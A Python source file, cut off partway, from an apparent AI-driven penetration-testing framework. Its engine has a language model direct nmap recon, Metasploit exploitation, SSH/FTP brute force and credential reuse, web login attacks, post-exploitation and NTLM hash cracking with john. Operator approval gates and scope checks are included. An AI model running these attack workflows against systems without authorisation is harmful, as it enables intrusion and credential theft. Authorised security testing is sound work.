"""
Engagement orchestration engine — Phase 3 upgrade.

Changes from Phase 2:
  - ExploitDB replaced by ExploitSuggestionProvider (generic, confidence-scored).
  - _plan_phases() now produces branch-aware plans:
      recon-only, validation, credential-led, web-led, exploit-led.
  - _exploitation_phase() uses ExploitSuggestion objects (non-MSF modes respected).
  - _post_exploit_phase() delegates to PostAccessHandler factory.
  - Engagement can conclude professionally without exploitation.
"""

import base64
import logging
import time
from pathlib import Path

from rich.padding import Padding
from rich.tree import Tree

from hydrasight.cli.display import (
    analysis_panel,
    console,
    div,
    err,
    hit,
    info,
    label,
    ok,
    phase_header,
    raw_output,
    result_line,
    spinner,
    stats_line,
    task_line,
    warn,
)
from hydrasight.config.defaults import PHASE_DEFS, P
from hydrasight.integrations.exploit_suggestion import (
    ExecutionMode,
    ExploitSuggestion,
    ExploitSuggestionProvider,
)
from hydrasight.integrations.kali_api import KaliAPI
from hydrasight.models.findings import Findings
from hydrasight.models.planner_state import PlannerState
from hydrasight.models.roe import RulesOfEngagement
from hydrasight.parsers import Parser
from hydrasight.services.ai_client import AIClient
from hydrasight.services.dispatcher import Dispatcher
from hydrasight.services.post_access import (
    PostAccessHandler,
    PostAccessResult,
)
from hydrasight.services.verifier import VerifierService
from hydrasight.utils.ip_utils import dedup_ports
from hydrasight.utils.time_utils import ts


class Engine:
    """Orchestrates the full engagement lifecycle."""

    def __init__(
        self,
        ai: AIClient,
        kali: KaliAPI,
        dispatcher: Dispatcher,
        findings: Findings,
        cfg: dict,
        log: logging.Logger,
        roe: RulesOfEngagement | None = None,
        session_manager=None,
    ) -> None:
        self.ai = ai
        self.kali = kali
        self.dispatcher = dispatcher
        self.findings = findings
        self.cfg = cfg
        self.log = log
        self.roe = roe or RulesOfEngagement.permissive()
        self.session_manager = session_manager
        self.verbosity = cfg.get("verbosity", 1)
        self.aborted = False
        # Created fresh per engagement in run()
        self._state: PlannerState | None = None
        self._verifier: VerifierService | None = None

    def _save_session(self, status: str = "in progress") -> None:
        """Persist the current session state if a session manager is available."""
        if self.session_manager and self.findings.has_data:
            self.session_manager.save_session(self.findings, self._state, status)

    # ── ROE helpers ───────────────────────────────────────────────────────────

    def _roe_check_target(self, target: str) -> bool:
        allowed, reason = self.roe.is_target_allowed(target)
        if not allowed:
            err(f"ROE violation — target blocked: {reason}")
            self.log.warning("roe: target blocked: %s — %s", target, reason)
        return allowed

    def _roe_check_runtime(self) -> bool:
        if self.roe.is_runtime_exceeded():
            warn(f"ROE max runtime ({self.roe.max_runtime_minutes}m) exceeded — stopping")
            self.log.warning("roe: max runtime exceeded")
            return False
        return True

    def _roe_request_approval(self, phase_id: str) -> bool:
        """
        Prompt operator to approve a gated phase.
        Returns True if approved, False to skip.
        """
        if self.roe.kill_switch:
            err("ROE kill switch is active — all actions blocked")
            return False
        if not self.roe.requires_approval(phase_id):
            return True
        remaining = self.roe.runtime_remaining_minutes()
        console.print()
        console.print(f"  [{P.AMBER}]┌─ APPROVAL REQUIRED ─────────────────────────────┐[/]")
        console.print(f"  [{P.AMBER}]│[/]  phase     [{P.TEXT}]{phase_id}[/]")
        console.print(f"  [{P.AMBER}]│[/]  runtime   [{P.MUTED}]{remaining:.1f} min remaining[/]")
        console.print(f"  [{P.AMBER}]└─────────────────────────────────────────────────┘[/]")
        try:
            answer = console.input(f"  [{P.AMBER}]approve {phase_id}? (y/N) ›[/] ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            answer = "n"
        approved = answer in ("y", "yes")
        if not approved:
            info(f"{phase_id} skipped by operator")
            self.log.info("roe: %s skipped by operator", phase_id)
        return approved

    # ── core ask-and-run loop ─────────────────────────────────────────────────

    def _ask_and_run(self, task: str, phase_id: str) -> tuple[str, str]:
        if self.aborted:
            return "", ""
        if self.verbosity >= 1:
            preview = task if len(task) < 140 else task[:137] + "…"
            console.print(f"\n  [{P.MUTED}]task[/]    [{P.TEXT}]{preview}[/]")
        with spinner("waiting for model") as prog:
            prog.add_task("t", total=None)
            ai_resp = self.ai.ask(task)
        if not ai_resp:
            err("no response from model — skipping phase")
            if self._state:
                self._state.record_phase(phase_id, False, "no model response")
            return "", ""
        tool_call = self.ai.extract_tool_call(ai_resp)
        if not tool_call:
            warn("could not parse tool call from model")
            if self.verbosity >= 2:
                console.print(f"  [{P.MUTED}]{ai_resp[:200]}[/]")
            if self._state:
                self._state.record_phase(phase_id, False, "no tool call parsed")
            return "", ""

        tool = tool_call.get("tool", "unknown")

        # ROE: block calls to blocked ports/modules via dispatcher
        args = tool_call.get("args", {}) or {}
        if self.roe.is_port_blocked(int(args.get("rport", 0))):
            warn(f"ROE: port {args.get('rport')} is blocked — skipping")
            if self._state:
                self._state.record_phase(
                    phase_id,
                    False,
                    f"roe blocked port {args.get('rport')}",
                )
            return tool, ""

        task_line(tool)
        t0 = time.time()
        with spinner("executing") as prog:
            prog.add_task("t", total=None)
            tool_name, output, elapsed = self.dispatcher.dispatch(tool_call)
        duration = time.time() - t0

        warnings = Parser.validate(tool_name, output, elapsed)
        result_line(tool_name, elapsed, len(output), warnings)
        raw_output(output, self.verbosity)
        self._ingest(output, phase_id)

        # PlannerState tool tracking
        if self._state:
            self._state.record_tool_outcome(tool_name, bool(output), len(output))

        analysis = self.ai.ask(
            f"Tool: {tool_name}\nOutput:\n{output[:3000]}\n\n"
            "Analyse using EXACTLY this plain text format:\n"
            "PORTS: ...\nVULNS: ...\nCREDS: ...\nSESSIONS: ...\nNOTES: ..."
        )
        if analysis:
            analysis_panel(analysis)
        stats_line(self.findings)
        self.findings.add_event(
            phase_id,
            f"{tool_name} — {len(output)} bytes",
            tool=tool_name,
            outcome="success" if output else "empty",
            bytes_out=len(output),
        )
        self._save_session()

        if self._state:
            self._state.record_phase(
                phase_id,
                bool(output),
                reason="" if output else "empty output",
                tools_used=[tool_name],
                bytes_out=len(output),
                duration_s=duration,
            )
        return tool_name, output

    # ── findings ingestion ────────────────────────────────────────────────────

    def _ingest(self, output: str, phase: str) -> None:
        if not output:
            return
        for p in Parser.ports(output):
            self.findings.add_port(p["port"], p["proto"], p["service"], p["version"])
            if self._state:
                self._state.mark_port_explored(p["port"])
        for h in Parser.hashes(output):
            self.findings.add_hash(h["username"], h["lm"], h["ntlm"])
            self.findings.add_cred(
                h["username"],
                h["ntlm"],
                kind="ntlm_hash",
                source=phase,
            )
            if phase == "POST_EXPLOIT":
                hit(f"hash captured  {h['username']}")
        for c in Parser.hydra_creds(output):
            self.findings.add_cred(
                c["username"],
                c["password"],
                kind="bruteforce",
                source=f"hydra-{c['service']}",
            )
            hit(f"creds found  {c['username']}:{c['password']} on {c['service']}")
        for d in Parser.dirs(output):
            self.findings.add_dir(d["path"], d["status"])
        for cve in Parser.cves(output):
            ctx = Parser.cve_context(cve, output)
            self.findings.add_vuln(
                name=cve.upper(),
                severity="HIGH",
                description=ctx,
                cve=cve.upper(),
                phase=phase,
            )
        if Parser.is_ms17(output) and phase == "SMB_CHECK":
            self.findings.add_vuln(
                name="MS17-010 EternalBlue",
                severity="CRITICAL",
                description=("SMBv1 RCE — unauthenticated remote code execution"),
                cve="CVE-2017-0144",
                port=445,
                phase=phase,
                source_tool="nmap",
                confidence=0.7,
            )
        if Parser.has_anon_ftp(output) and phase in ("FTP_CHECK", "RECON"):
            self.findings.add_vuln(
                name="Anonymous FTP Access",
                severity="MEDIUM",
                description="FTP server allows anonymous login",
                port=21,
                phase=phase,
                source_tool="nmap",
                confidence=0.8,
            )
        os_info = Parser.os_info(output)
        if os_info:
            self.findings.host_info["os"] = os_info
        shares = Parser.smb_shares(output)
        if shares:
            self.findings.host_info["smb_shares"] = shares

    # ── verification ──────────────────────────────────────────────────────────

    def _run_verification(self, target: str) -> None:
        """Run targeted second-pass probes on CRITICAL/HIGH findings."""
        if not self._verifier:
            return
        unverified = [r for r in self.findings.finding_records if not r.verification_attempted]
        if not unverified:
            return
        info(f"verifying {len(unverified)} finding(s)")
        results = self._verifier.verify_findings(
            self.findings, target=target, only_high_and_above=True
        )
        v_count = sum(1 for r in results if r.verified)
        f_count = len(results) - v_count
        if results:
            ok(f"verification: {v_count} confirmed  {f_count} not confirmed")
        for r in results:
            if r.verified:
                hit(f"verified     {r.finding_name}")
            else:
                info(f"unconfirmed  {r.finding_name}  ({r.note})")

    # ── exploitation ──────────────────────────────────────────────────────────

    def _run_exploit(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
        """Execute a single ExploitSuggestion. Returns (success, uid)."""
        # ROE: check module blocking (Metasploit paths)
        if suggestion.execution_mode == ExecutionMode.METASPLOIT:
            if self.roe.is_module_blocked(suggestion.msf_module):
                warn(f"ROE: module '{suggestion.msf_module}' blocked")
                return False, ""

        # ROE: check port blocking
        if suggestion.rport and self.roe.is_port_blocked(suggestion.rport):
            warn(f"ROE: port {suggestion.rport} blocked by ROE")
            return False, ""

        info(
            f"trying [{suggestion.execution_mode.value}] "
            f"{suggestion.title}  "
            f"(conf {suggestion.confidence:.0%})"
        )

        # ── non-Metasploit modes ───────────────────────────────────────────
        if suggestion.execution_mode in (ExecutionMode.BRUTE_FORCE, ExecutionMode.SAFE_AUXILIARY):
            return self._run_auxiliary(suggestion, target)

        if suggestion.execution_mode == ExecutionMode.CREDENTIAL_REUSE:
            return self._run_cred_reuse(suggestion, target)

        if suggestion.execution_mode == ExecutionMode.SSH_ACCESS:
            return self._run_ssh_access(suggestion, target)

        if suggestion.execution_mode == ExecutionMode.FTP_ACCESS:
            return self._run_ftp_access(suggestion, target)

        if suggestion.execution_mode == ExecutionMode.WEB_LOGIN:
            return self._run_web_login(suggestion, target)

        if suggestion.execution_mode == ExecutionMode.MANUAL_CHECK:
            info(f"manual check required: {suggestion.title}")
            info(f"rationale: {suggestion.rationale}")
            return False, ""

        # ── Metasploit path ────────────────────────────────────────────────
        tool_call = {
            "tool": "post_exploit",
            "args": {
                "target": target,
                "module": suggestion.msf_module,
                "rport": suggestion.rport,
                "lport": self.cfg["lport"],
                "payload": suggestion.msf_payload or None,
                "commands": suggestion.post_commands or "getuid;sysinfo",
            },
        }
        task_line("post_exploit")
        with spinner("exploiting") as prog:
            prog.add_task("t", total=None)
            _, output, elapsed = self.dispatcher.dispatch(tool_call)
        result_line("post_exploit", elapsed, len(output), [])
        raw_output(output, self.verbosity)
        self._ingest(output, "EXPLOIT")
        sid = Parser.session_id(output)
        uid = Parser.uid(output)
        opened = "session" in output.lower() and "opened" in output.lower()
        if sid or uid or opened:
            uid = uid or "unknown"
            self.findings.add_session(
                id=sid,
                uid=uid,
                exploit=suggestion.title,
                payload=suggestion.msf_payload,
                target=target,
                module=suggestion.msf_module,
                rport=suggestion.rport,
            )
            self.findings.add_vuln(
                name=f"{suggestion.title} — Exploited",
                severity="CRITICAL",
                description=f"Session opened as {uid} via {suggestion.title}",
                cve=suggestion.cve,
                port=suggestion.rport,
                phase="EXPLOIT",
                source_tool="msfconsole",
                confidence=1.0,
            )
            # Mark matched FindingRecords as proven
            for rec in self.findings.finding_records:
                name_low = rec.name.lower()
                if suggestion.title.lower() in name_low or (
                    suggestion.cve and suggestion.cve.lower() in name_low
                ):
                    rec.mark_proven(f"session opened as {uid}")
            self._compromise_banner(
                target,
                uid,
                # shim to old banner API
                {
                    "name": suggestion.title,
                    "cve": suggestion.cve,
                    "module": suggestion.msf_module,
                    "rport": suggestion.rport,
                    "payload": suggestion.msf_payload,
                },
            )
            return True, uid
        return False, ""

    def _run_auxiliary(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
        """Run a safe auxiliary scanner/brute-force suggestion."""
        if suggestion.msf_module:
            tool_call = {
                "tool": "post_exploit",
                "args": {
                    "target": target,
                    "module": suggestion.msf_module,
                    "rport": suggestion.rport,
                    "lport": self.cfg["lport"],
                    "payload": None,
                    "commands": "",
                },
            }
        elif suggestion.execution_mode == ExecutionMode.BRUTE_FORCE:
            svc = suggestion.target_service.lower()
            tool = f"{svc}_brute" if svc in ("ssh", "ftp") else "ssh_brute"
            tool_call = {
                "tool": tool,
                "args": {"target": target},
            }
        else:
            return False, ""
        task_line(suggestion.msf_module or suggestion.title)
        with spinner("scanning") as prog:
            prog.add_task("t", total=None)
            _, output, elapsed = self.dispatcher.dispatch(tool_call)
        result_line(suggestion.title, elapsed, len(output), [])
        raw_output(output, self.verbosity)
        self._ingest(output, "EXPLOIT")
        return bool(output), ""

    def _run_cred_reuse(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
        """Try captured credentials against the target service."""
        info("attempting credential reuse (not yet implemented — manual check)")
        return False, ""

    def _run_ssh_access(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
        """Try captured credentials over SSH."""
        if not self.findings.credentials:
            return False, ""
        cred = self.findings.credentials[0]
        username = cred["username"]
        secret = cred["secret"]
        if self._state and self._state.credential_already_tried(username, secret):
            info(f"credential already tried for {username} — skipping")
            return False, ""
        if self._state:
            self._state.record_credential_attempt(username, secret)
        cmd = (
            f"sshpass -p '{secret}' ssh "
            f"-o StrictHostKeyChecking=no -o ConnectTimeout=8 "
            f"{username}@{target} 'id;uname -a' 2>&1"
        )
        task_line("ssh_access")
        with spinner("trying ssh") as prog:
            prog.add_task("t", total=None)
            _, output, elapsed = self.dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": cmd}}
            )
        result_line("ssh_access", elapsed, len(output), [])
        raw_output(output, self.verbosity)
        uid = Parser.uid(output)
        if uid or "uid=" in output.lower():
            uid = uid or "unknown"
            self.findings.add_session(
                uid=uid,
                exploit="SSH credential reuse",
                payload="ssh",
                target=target,
                username=username,
            )
            hit(f"ssh access as {uid}")
            return True, uid
        return False, ""

    def _run_ftp_access(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
        """Try captured credentials over FTP."""
        if not self.findings.credentials:
            return False, ""
        cred = self.findings.credentials[0]
        username = cred["username"]
        secret = cred["secret"]
        cmd = f"curl -s --connect-timeout 8 ftp://{username}:{secret}@{target}/ 2>&1"
        task_line("ftp_access")
        with spinner("trying ftp") as prog:
            prog.add_task("t", total=None)
            _, output, elapsed = self.dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": cmd}}
            )
        result_line("ftp_access", elapsed, len(output), [])
        raw_output(output, self.verbosity)
        if output and "error" not in output.lower():
            self.findings.add_session(
                uid=username,
                exploit="FTP credential access",
                payload="ftp",
                target=target,
                username=username,
            )
            hit(f"ftp access as {username}")
            return True, username
        return False, ""

    def _run_web_login(self, suggestion: ExploitSuggestion, target: str) -> tuple[bool, str]:
        """
        Try captured credentials against common web login forms.

        Uses WebAdminHandler (Phase 4) — curl-based credential reuse
        against phpMyAdmin, WordPress, Tomcat Manager, Roundcube.
        """
        from hydrasight.services.post_access import WebAdminHandler

        if not self.findings.credentials:
            info("no credentials captured — skipping web login attempt")
            return False, ""

        # Pick best credential to try (most recently captured first)
        cred = self.findings.credentials[-1]
        username = cred["username"]
        secret = cred["secret"]

        # Dedup: skip if already tried this cred on a web path
        if self._state and self._state.credential_already_tried(username, secret):
            info(f"credential already tried for {username} — skipping")
            return False, ""
        if self._state:
            self._state.record_credential_attempt(username, secret)

        # Build session record for the handler
        session = {
            "username": username,
            "password": secret,
            "rport": suggestion.rport or 80,
            "payload": "web_admin",
        }

        handler = WebAdminHandler(self.log, session)
        task_line("web_login")
        with spinner("trying web login") as prog:
            prog.add_task("t", total=None)
            result = handler.execute(
                self.dispatcher,
                target,
                lhost=self.kali.local_ip(target),
                lport=self.cfg.get("lport", 4444),
                cfg=self.cfg,
            )
        result_line("web_login", 0.0, len(result.output), [])
        raw_output(result.output, self.verbosity)

        if result.success:
            for artifact in result.artifacts:
                self.findings.add_session(
                    uid=username,
                    exploit=f"Web credential reuse ({artifact})",
                    payload="web_admin",
                    target=target,
                    username=username,
                )
                hit(f"web access: {artifact}")
            return True, username
        return False, ""

    def _compromise_banner(self, target: str, uid: str, exploit: dict) -> None:
        console.print()
        console.print(f"  [{P.BRIGHT}]╔{'═' * 60}╗[/]")
        console.print(
            f"  [{P.BRIGHT}]║[/]  [bold {P.BRIGHT}]TARGET COMPROMISED[/]{'': <39}[{P.BRIGHT}]║[/]"
        )
        console.print(f"  [{P.BRIGHT}]╠{'═' * 60}╣[/]")
        for lbl_str, val, color in [
            ("host    ", target, P.TEXT),
            ("access  ", uid, P.BRIGHT),
            ("exploit ", exploit["name"][:42], P.TEXT),
            ("cve     ", exploit.get("cve", "—")[:42], P.AMBER),
            ("hashes  ", str(len(self.findings.hashes)), P.BRIGHT),
        ]:
            console.print(
                f"  [{P.BRIGHT}]║[/]  [{P.MUTED}]{lbl_str}[/]  "
                f"[{color}]{val.ljust(42)}[/]  [{P.BRIGHT}]║[/]"
            )
        console.print(f"  [{P.BRIGHT}]╚{'═' * 60}╝[/]")
        console.print()

    def _exploitation_phase(self, target: str) -> bool:
        suggestions = ExploitSuggestionProvider.from_findings(
            self.findings, planner_state=self._state
        )
        # Filter out manual checks and suggestions with no active action
        actionable = [s for s in suggestions if s.execution_mode != ExecutionMode.MANUAL_CHECK]
        if not actionable:
            info("no exploit candidates matched discovered services")
            manual = ExploitSuggestionProvider.manual_suggestions(self.findings)
            if manual:
                info("manual investigation paths:")
                for m in manual:
                    info(f"  · {m.title} — {m.rationale}")
            return False
        console.print()
        console.print(f"  [{P.RED}]┌{'─' * 60}┐[/]")
        console.print(
            f"  [{P.RED}]│[/]  "
            f"[bold {P.RED}]access candidates: {len(actionable)}[/]"
            f"  [{P.MUTED}](approval required)[/]"
            f"{'': <5}[{P.RED}]│[/]"
        )
        console.print(f"  [{P.RED}]└{'─' * 60}┘[/]")
        for i, suggestion in enumerate(actionable, 1):
            if self.aborted:
                break
            if not self._roe_check_runtime():
                break
            console.print(
                f"\n  [{P.DIM}]attempt {i}/{len(actionable)}[/]  "
                f"[{P.MUTED}]{suggestion.execution_mode.value}[/]  "
                f"conf {suggestion.confidence:.0%}"
            )
            success, _ = self._run_exploit(suggestion, target)
            if success:
                return True
        warn("all access attempts exhausted")
        info("HydraSight has captured available evidence — see findings")
        return False

    def _post_exploit_phase(self, target: str) -> None:
        if not self.findings.sessions:
            info("no active session — skipping post-exploitation")
            return
        last = self.findings.sessions[-1]
        lhost = self.kali.local_ip(target)
        base_lport = int(self.cfg.get("lport", 4444))
        new_lp = base_lport + 1 if base_lport < 65534 else base_lport - 1
        # Select handler via factory
        handler = PostAccessHandler.for_session(last, self.log)
        info(f"post-access handler: {handler.access_type.value}  lport {new_lp}")
        task_line("post_access")
        with spinner("post-exploiting") as prog:
            prog.add_task("t", total=None)
            result: PostAccessResult = handler.execute(
                self.dispatcher, target, lhost, new_lp, self.cfg
            )
        result_line(
            "post_access",
            0.0,
            len(result.output),
            Parser.validate("post_exploit", result.output, 0.0),
        )
        raw_output(result.output, self.verbosity)
        if result.output:
            self._ingest(result.output, "POST_EXPLOIT")
            analysis = self.ai.ask(
                f"Tool: post_exploit\nOutput:\n{result.output[:3000]}\n\n"
                "Analyse using PORTS/VULNS/CREDS/SESSIONS/NOTES format."
            )
            if analysis:
                analysis_panel(analysis)
            stats_line(self.findings)
        self.findings.add_event(
            "POST_EXPLOIT",
            f"post-access ({handler.access_type.value}) — {len(result.output)} bytes",
            tool="post_exploit",
            outcome="success" if result.output else "empty",
            bytes_out=len(result.output),
        )
        self._save_session()
        if self._state:
            self._state.record_phase(
                "POST_EXPLOIT",
                result.success,
                reason=result.notes,
                bytes_out=len(result.output),
            )

    # ── hash cracking ─────────────────────────────────────────────────────────

    def _crack_hashes(self) -> None:
        if not self.findings.hashes:
            info("no hashes captured — skipping credential recovery")
            return
        rockyou = Path(self.cfg["rockyou_path"])
        if not rockyou.exists():
            warn(f"rockyou not found at {rockyou}")
            info(
                "install: sudo apt install wordlists && gunzip /usr/share/wordlists/rockyou.txt.gz"
            )
            return
        hash_lines = "\n".join(f"{h['username']}:$NT${h['ntlm']}" for h in self.findings.hashes)
        b64 = base64.b64encode(hash_lines.encode()).decode()
        cmd = (
            f"HFILE=$(mktemp /tmp/hs_XXXXXX.txt) && "
            f"printf '%s' '{b64}' | base64 -d > \"$HFILE\" && "
            f"john --format=NT --wordlist={rockyou} "
            f'"$HFILE" --pot=/tmp/hs.pot 2>&1 ; '
            f"echo '---CRACKED---' ; "
            f'john --format=NT --show "$HFILE" '
            f"--pot=/tmp/hs.pot 2>&1 ; "
            f'rm -f "$HFILE"'
        )
        info(f"cracking {len(self.findings.hashes)} hashes with john")
        task_line("run_command")
        with spinner("running john") as prog:
            prog.add_task("t", total=None)
            _, output, elapsed = self.dispatcher.dispatch(
                {"tool": "run_command", "args": {"command": cmd}}
            )
        result_line("run_command", elapsed, len(output), [])
        raw_output(output, self.verbosity)
        if not output:
            warn("john produced no output")
            return
        import re

        cracked_users: set[str] = set()
        in_cracked = False
        for line in output.splitlines():
            line = line.strip()
            if line == "---CRACKED---":
                in_cracked = True
                continue
            if not in_cracked:
                continue
            m = re.match(r"^([^:]+):([^:$][^:]*?)(?::|$)", line)
            if not m:
                continue
            user, pw = m.group(1).strip(), m.group(2).strip()
            if not pw or len(pw) > 64 or user.isdigit():
                continue
            if user in cracked_users:
                continue
            cracked_users.add(user)
            for h in self.findings.hashes:
                if h["username"].lower() == user.lower() and not h["cracked"]:
                    h["cracked"] = pw
            self.findings.add_cred(user, pw, kind="cracked", source="john")
            # Mark associated finding_records as proven
            for rec in self.findings.finding_records:
                if "hash" in rec.name.lower() or "ntlm" in rec.name.lower():
                    rec.mark_proven(f"password cracked: {user}:{pw}")
            hit(f"cracked  {user}  →  {pw}")
        found = len(cracked_users)
        if found == 0:
            info("no passwords recovered from rockyou wordlist")
        else:
            ok(f"recovered {found} password(s)")
        self.findings.add_event(
            "HASH_CRACK",
            f"john completed — {found} cracked",
            tool="john",
            outcome="success" if found > 0 else "empty",
            bytes_out=len(output),
        )
        self._save_session()
        if self._state:
            self._state.record_phase(
                "HASH_CRACK",
                found > 0,
                reason=f"{found} passwords recovered",
            )

    # ── adaptive planner ──────────────────────────────────────────────────────

    def _plan_phases(self) -> list[str]:  # noqa: C901
        """
        Branch-aware adaptive phase planner.

        Selects an appropriate end-state branch based on what was
        discovered during RECON. Compromise is NOT the only success path.

        Branches (in priority order):
          1. credential-led  — captured creds → try reuse first
          2. exploit-led     — verified/high-confidence vulns → EXPLOIT
          3. web-led         — web services without clear exploit → WEB_*
          4. validation-only — vulns found but ROE blocks exploit
          5. recon-only      — nothing actionable; report evidence
        """
        plan: list[str] = []
        port_set = {p["port"] for p in self.findings.ports}
        services = {p["service"].lower() for p in self.findings.ports}
        has_web = any(s in services for s in ("http", "https", "http-alt"))
        has_smb = 445 in port_set or 139 in port_set
        has_ssh = 22 in port_set
        has_ftp = 21 in port_set
        has_creds = bool(self.findings.credentials)
        has_vulns = bool(self.findings.vulns)
        exploit_gated = self.roe.requires_approval("EXPLOIT")

        # ── service-specific recon phases ─────────────────────────────────
        if has_ftp:
            plan.append("FTP_CHECK")
        if has_smb:
            plan.append("SMB_CHECK")
        if has_ssh:
            plan.append("SSH_CHECK")
        if has_web:
            plan.extend(["WEB_FINGER", "WEB_DIR", "WEB_VULN"])

        plan.append("VULN_SCAN")

        # ── determine branch ──────────────────────────────────────────────
        suggestions = ExploitSuggestionProvider.from_findings(
            self.findings, planner_state=self._state
        )
        has_exploit_suggestions = any(
            s.execution_mode != ExecutionMode.MANUAL_CHECK for s in suggestions
        )

        # Branch 1: credential-led (has creds → try reuse, lower barrier)
        if has_creds:
            plan.extend(["EXPLOIT", "POST_EXPLOIT"])
            self.log.info("planner: credential-led branch")

        # Branch 2: exploit-led (high-confidence vulns)
        elif has_exploit_suggestions and not exploit_gated:
            plan.extend(["EXPLOIT", "POST_EXPLOIT", "HASH_CRACK"])
            self.log.info("planner: exploit-led branch")

        # Branch 3: exploit-led with approval gate
        elif has_exploit_suggestions:
            plan.extend(["EXPLOIT", "POST_EXPLOIT", "HASH_CRACK"])
            self.log.info("planner: exploit-led branch (gated by ROE approval)")

        # Branch 4: validation-only (ROE blocks exploit or no suggestions)
        elif has_vulns:
            self.log.info("planner: validation-only branch (vulns found, no exploit path)")
            # No EXPLOIT phase — engagement concludes with evidence report

        # Branch 5: recon-only (nothing actionable)
        else:
            self.log.info("planner: recon-only branch — no actionable paths found")

        # HASH_CRACK added opportunistically if not already in plan
        if "HASH_CRACK" not in plan and (has_creds or has_vulns or has_exploit_suggestions):
            plan.append("HASH_CRACK")

        return plan

    # ── lifecycle ─────────────────────────────────────────────────────────────

    def abort(self) -> None:
        self.aborted = True
        warn("engagement abort requested")

    def run(self, target: str) -> None:  # noqa: C901, PLR0912
        """Full adaptive engagement with ROE enforcement and planner memory."""
        # ── ROE: validate target ───────────────────────────────────────────
        if not self._roe_check_target(target):
            return

        # ── ROE: check kill switch ─────────────────────────────────────────
        if self.roe.kill_switch:
            err("ROE kill switch is active — engagement blocked")
            return

        # ── initialise per-engagement state ───────────────────────────────
        self.ai.reset_for_engagement()
        self.dispatcher.canonical_target = target
        self.aborted = False
        self.findings.target = target
        self.findings.started_at = ts()
        self._state = PlannerState(max_retries=self.cfg.get("max_retries", 2))
        self._verifier = VerifierService(self.kali, self.log, target)
        self.roe.start_timer()
        t0 = time.time()

        console.print()
        div()
        console.print(
            f"  [bold {P.PRIMARY}]ENGAGEMENT[/]  [{P.DIM}]│[/]"
            f"  [{P.TEXT}]{target}[/]  [{P.DIM}]│[/]"
            f"  [{P.MUTED}]{ts()}[/]"
        )
        # Show ROE summary
        console.print(f"  [{P.DIM}]roe[/]     [{P.MUTED}]{self.roe.summary()}[/]")
        div()

        # ── reachability check ─────────────────────────────────────────────
        info("checking target reachability")
        check = self.kali.check_target(target)
        if check["reachable"]:
            ok(f"target {target} is reachable")
        else:
            warn(f"target {target} did not respond to ping — continuing with -Pn")

        # ── initial recon ──────────────────────────────────────────────────
        phase_header(
            "RECON",
            PHASE_DEFS["RECON"][0],
            PHASE_DEFS["RECON"][1],
            1,
            10,
        )
        self._ask_and_run(
            f"nmap scan {target} with scan_type -sV -sC "
            f"and ports {self.cfg['scan_range']} "
            f"and additional args -T4 -Pn --max-retries 1",
            "RECON",
        )

        if not self.findings.ports:
            warn("no open ports — trying deep scan")
            phase_header(
                "DEEP_SCAN",
                PHASE_DEFS["DEEP_SCAN"][0],
                PHASE_DEFS["DEEP_SCAN"][1],
                2,
                10,
            )
            self._ask_and_run(
                f"nmap scan {target} with scan_type -sS -sV "
                f"and ports 1-65535 "
                f"and additional args -T4 -Pn --min-rate 1000",
                "RECON",
            )

        if not self.findings.ports:
            err("no open ports discovered after deep scan")
            info("engagement complete — no services found")
            self._final_summary(target, time.time() - t0)
            self._save_session("completed")
            self.dispatcher.canonical_target = None
            return

        # ── adaptive phase planning ────────────────────────────────────────
        plan = self._plan_phases()
        total = len(plan) + 1
        info(f"adaptive plan: {len(plan)} phases")
        plan_tree = Tree(f"  [{P.MUTED}]execution plan[/]", guide_style=P.DIM)
        for ph in plan:
            lbl_t = PHASE_DEFS.get(ph, (ph, P.DIM))[0]
            gated = " [approval required]" if self.roe.requires_approval(ph) else ""
            plan_tree.add(f"[{P.PRIMARY}]{lbl_t}[/]  [{P.DIM}]({ph}){gated}[/]")
        console.print(Padding(plan_tree, (1, 0, 1, 4)))

        # ── execute phases ─────────────────────────────────────────────────
        idx = 1
        for phase_id in plan:
            if self.aborted:
                break
            if not self._roe_check_runtime():
                break
            idx += 1
            lbl_str, color = PHASE_DEFS.get(phase_id, (phase_id, P.DIM))

            # PlannerState: skip known-bad phases
            skip, skip_reason = self._state.should_skip_phase(phase_id)
            if skip:
                info(f"skipping {phase_id}: {skip_reason}")
                continue

            # ROE: approval gate
            if not self._roe_request_approval(phase_id):
                self._state.block_phase(phase_id)
                continue

            phase_header(phase_id, lbl_str, color, idx, total)

            if phase_id == "FTP_CHECK":
                port = next(
                    (p["port"] for p in self.findings.ports if p["service"] == "ftp"),
                    21,
                )
                self._ask_and_run(
                    f"run this command: nmap --script ftp-anon,ftp-vuln* -sV -p {port} {target}",
                    "FTP_CHECK",
                )
            elif phase_id == "WEB_FINGER":
                web = next(
                    (
                        p
                        for p in self.findings.ports
                        if p["service"] in ("http", "https", "http-alt")
                    ),
                    None,
                )
                if web:
                    scheme = "https" if "https" in web["service"] else "http"
                    self._ask_and_run(
                        f"whatweb scan {scheme}://{target}:{web['port']}",
                        "WEB_FINGER",
                    )
            elif phase_id == "WEB_DIR":
                web = next(
                    (
                        p
                        for p in self.findings.ports
                        if p["service"] in ("http", "https", "http-alt")
                    ),
                    None,
                )
                if web:
                    scheme = "https" if "https" in web["service"] else "http"
                    self._ask_and_run(
                        f"use gobuster_scan on "
                        f"{scheme}://{target}:{web['port']} "
                        f"wordlist {self.cfg['wordlist']}",
                        "WEB_DIR",
                    )
            elif phase_id == "WEB_VULN":
                web = next(
                    (
                        p
                        for p in self.findings.ports
                        if p["service"] in ("http", "https", "http-alt")
                    ),
                    None,
                )
                if web:
                    self._ask_and_run(
                        f"nikto scan {target} port {web['port']}",
                        "WEB_VULN",
                    )
            elif phase_id == "SMB_CHECK":
                self._ask_and_run(
                    f"run this command: nmap --script "
                    f"smb-vuln-ms17-010,smb-os-discovery "
                    f"-p 445 {target}",
                    "SMB_CHECK",
                )
            elif phase_id == "SSH_CHECK":
                self._ask_and_run(
                    f"run this command: nmap --script "
                    f"ssh-auth-methods,ssh2-enum-algos "
                    f"-p 22 {target}",
                    "SSH_CHECK",
                )
            elif phase_id == "VULN_SCAN":
                port_str = ",".join(str(n) for n in dedup_ports(self.findings.ports))
                self._ask_and_run(
                    f"run this command: nmap -sV --script vuln "
                    f"-T4 -Pn --script-timeout 60s "
                    f"-p {port_str} {target}",
